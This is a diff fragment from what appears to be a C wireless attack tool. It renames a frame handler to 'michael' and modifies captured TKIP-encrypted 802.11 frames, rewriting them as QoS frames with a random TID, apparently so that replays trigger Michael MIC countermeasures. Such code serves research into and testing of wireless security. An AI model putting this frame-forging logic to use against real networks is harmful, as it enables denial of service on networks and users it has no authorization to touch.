@@ -6,6 +6,7 @@
 #include <moepcommon/util.h>
 
 #include "michael.h"
+#include "../frametypes.h"
 #include "../global.h"
 #include "../helper.h"
 #include "../radiotap.h"
@@ -26,11 +27,12 @@
  */
 
 moep_frame_t
-ccmpkill(moep_frame_t frame)
+michael(moep_frame_t frame)
 {
 	size_t len;
 	struct ieee80211_hdr_gen *hdr;
 	struct ieee80211_encryption_hdr *enc_hdr;
+	struct ieee80211_qos_ctrl *qos;
 	struct moep80211_radiotap *rt;
 
 	// encryption header should follow directly to the generic header
@@ -39,9 +41,8 @@ ccmpkill(moep_frame_t frame)
 	if (len < sizeof(struct ieee80211_encryption_hdr))
 		return NULL; // cannot be a valid encryption header
 
-	hdr = moep_frame_ieee80211_hdr(frame);
-
 	// double-check that the frame is valid and TKIP-encrypted
+	hdr = moep_frame_ieee80211_hdr(frame);
 	if (!ieee80211_is_data(hdr->frame_control))
 		return NULL;
 	if (!ieee80211_has_protected(hdr->frame_control))
@@ -57,13 +58,15 @@ ccmpkill(moep_frame_t frame)
 		&& !ieee80211_has_tods(hdr->frame_control)))
 		return NULL;
 
-	fprintf(stdout, "got suitable TKIP encrypted frame from %s to %s\n",
+	LOG(LOG_INFO, "got suitable TKIP encrypted frame from %s to %s\n",
 			mac_ntoa(hdr->addr2), mac_ntoa(hdr->addr1));
 
 	// make it look like a QoS frame
 	hdr->frame_control &= htole16(~IEEE80211_STYPE_DATA);
 	hdr->frame_control |=  htole16(IEEE80211_STYPE_QOS_DATA);
-	hdr->qos_ctrl = 0x0007;
+	// qos (set 2-byte value to 0x0007)
+	qos = (struct ieee80211_qos_ctrl *)&hdr->qos_ctrl; // = 0x0007;
+	qos->tid = rand() & 0x0f;
 
 	// init radiotap header to defaults
 	rt = moep_frame_radiotap(frame);
